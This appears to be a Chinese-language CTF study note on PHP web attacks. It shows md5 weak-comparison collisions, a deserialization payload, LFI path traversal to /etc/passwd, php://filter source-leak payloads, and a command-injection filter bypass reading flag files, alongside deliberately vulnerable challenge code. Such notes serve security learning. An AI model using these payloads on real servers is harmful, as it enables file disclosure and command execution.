# PHP

## Basic

### POST and GET

* GET参数直接附加在url上，用`&`隔开
* POST参数，HTTP头部添加`Content-Type: application/x-www-form-urlencoded`，报文主体空一行写body，同样用`&`隔开



## 比较绕过

PHP `==`为弱比较，`===`为强比较。比较绕过：https://blog.csdn.net/qq_47804678/article/details/128814377

Refer: https://blog.csdn.net/weixin_44511709/article/details/102912004

* PHP中，`==`弱类型判断
* **当md5结果为`0exxxx`，则php当作科学计数法，永远为0**







### Example 1

Example: BUU CODE REVIEW 1

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

1. 使用弱相等碰撞
   ```
   pleasepost=2&md51=s1885207154a&md52=s1836677006a&obj=1
   ```

2. 反序列化漏洞

   * 强比较，需要将`input`指向`correct`，创造完全相等
     ```php
     $obj = new BUU;
     $obj->input = &obj->correct;
     echo serialize($obj);
     ```

   * 使用 PHP playground 运行，输出序列化结果
     ```
     O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
     ```

     

## LFI

LFI漏洞通常出现在使用文件包含函数的应用程序中，这些函数根据用户提供的参数来包含文件。例如，在PHP中，`include()` 或 `require()` 函数经常被用来包含其他文件。如果用户输入没有正确过滤，攻击者可以操纵文件路径，使应用程序包含服务器上的任意文件。

### LFI的原理

当应用程序使用如下的代码时，就可能存在LFI漏洞：

```
<?php
$file =$_GET['file'];
include($file);
?>
```

如果攻击者可以控制`$file`的值，他们就可能包含服务器上的任何文件，例如：

```
http://example.com/index.php?file=../../etc/passwd
```

### PHP 伪协议

https://blog.csdn.net/yao_xin_de_yuan/article/details/108326427

* `php://input` 用于读取post数据流

  ```
  条件：
  allow_url_include=On
  allow_url_fopen-Off/On
  
  POC:
  file =php://input
  POST:phpinfo();
  ```

* **php://filter** 是一种元封装器， 设计用于数据流打开时的[筛选过滤](http://php.net/manual/zh/filters.php)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile()](http://php.net/manual/zh/function.readfile.php)、 [file()](http://php.net/manual/zh/function.file.php) 和 [file_get_contents()](http://php.net/manual/zh/function.file-get-contents.php)， 

  ```
  条件：
  allow_url_fopen=Off/On
  allow_url_include=Off/On
  
  
  POC:
  ?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
  ```

* ...



### example

#### [ACTF2020 新生赛]Include

使用PHP伪协议泄露源码

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

#### Ping Ping Ping

命令注入，**需要绕过**

命令注入：https://blog.csdn.net/Manuffer/article/details/120672448

* `&`: 替代`|`
* ` `: 替代`$IFS$9`
* `"`
* `flag`: **拼接后还会检查，无法用变量绕过**
* `bash`
* `<`

获得源码：`a;cat$IFS$9index.php`

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

代码中的正则表达式过滤了以下元素：

1. `& / ? * < > ' " \ ( ) [ ] { }`
16. 控制字符（ASCII码从0到31）：这里用`[\x{00}-\x{1f}]`表示，它匹配了从十六进制的00到1F的所有字符，这些通常是不可见的控制字符。

**绕过flag**: flag检查为顺序，逆向即可绕过 `a;a=ag;b=fl;cat$IFS$9$b$a.php`
